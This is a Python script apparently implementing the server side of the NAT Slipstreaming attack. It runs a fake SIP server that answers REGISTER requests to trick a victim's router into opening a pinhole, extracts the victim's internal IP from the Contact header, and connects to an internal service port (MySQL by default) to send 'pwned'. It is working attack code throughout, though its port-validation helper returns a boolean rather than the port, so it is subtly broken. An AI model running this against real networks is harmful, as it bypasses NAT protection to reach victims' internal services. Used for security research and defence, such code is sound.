#!/usr/bin/python3
### Simple SIP Server - natty slipstream
### Just handles SIP part (no HTTP magic)
### Inspired by NAT Slipstream code (https://samy.pl/slipstream)

from socket import socket, SOL_SOCKET, SOCK_STREAM, SO_REUSEADDR, AF_INET
from re import search
from http.server import HTTPServer
from handler import Handler
from argparse import ArgumentParser
from threading import Thread


def run(listen_port, pwn_port):
	Handler.port_num = pwn_port
	httpd = HTTPServer(('', listen_port), Handler)
	httpd.serve_forever()


# Type to ensure port range. Could use argparse's "choices" option, but it looks terrible in the help output
def port(num):
	if isinstance(num, int):
		return 1 <= num <= 65535
	return False


def get_args():
	parser = ArgumentParser(description='NAT Slipstreaming via Python')
	parser.add_argument('pwn_port', help='Port on the victim to connect to', type=port, default=3306)
	parser.add_argument('-l', '--listen-port', help='Port for the HTTP server to listen on.', default=8080, type=port)

	return parser.parse_args()


def main(args):
	# used for finding IPs to match
	contact_pattern = r'(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)'

	http_thread = Thread(target=run, args=(args.listen_port, args.pwn_port))
	http_thread.start()

	s = socket(AF_INET, SOCK_STREAM)
	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	s.bind(("", 5060))
	s.listen()
	i = 1

	while True:
		con, client = s.accept()
		print("Connection from", client)
		done = 0

		incoming_message = ""

		while done < 4:  # simple way to detect EOM
			dataFromClient = con.recv(1)
			d = dataFromClient.decode()
			incoming_message += d
			print(d, end="")

			done = done + 1 if d in "\r\n" else 0

		contact = ""
		via = ""

		header = '-' * 5 + ' RECEIVED ' + '-' * 5

		print('-' * 5, 'RECEIVED', '-' * 5)
		print(incoming_message)
		print('-' * len(header))

		for line in incoming_message.splitlines():
			if line.startswith("Contact:"):
				contact = line
				print('Contact: \"{}\"'.format(contact))

			if line.startswith("Via:"):
				via = line
				print('Via: \"{}\"'.format(via))

		print("Sending response #{}".format(i))
		i += 1

		BODY = "SIP/2.0 200 OK\r\n" + \
		       via + ";received=0.0.0.0\r\n" + \
		       "From: <sip:wuzzi@example.org;transport=TCP>;tag=U7c3d519\r\n" + \
		       "To: <sip:wuzzi@example.org;transport=TCP>;tag=37GkEhwl6\r\n" + \
		       "Call-ID: aaaaaaaaaaaaaaaaa0404aaaaaaaaaaaabbbbbbZjQ4M2M.\r\n" + \
		       "CSeq: 1 REGISTER\r\n" + \
		       contact + ";expires=3600\r\n" + \
		       "Content-Length: 0\r\n\r\n"

		print(BODY)
		print('-' * len(header))

		con.send(BODY.encode("ascii"))
		con_ip = search(contact_pattern, contact).group()
		s2 = socket(AF_INET, SOCK_STREAM)
		s2.connect((con_ip, args.pwn_port))
		s2.send(b'pwned')
		s2.close()

		con.close()
		print("Response sent.")


if __name__ == '__main__':
	main(get_args())
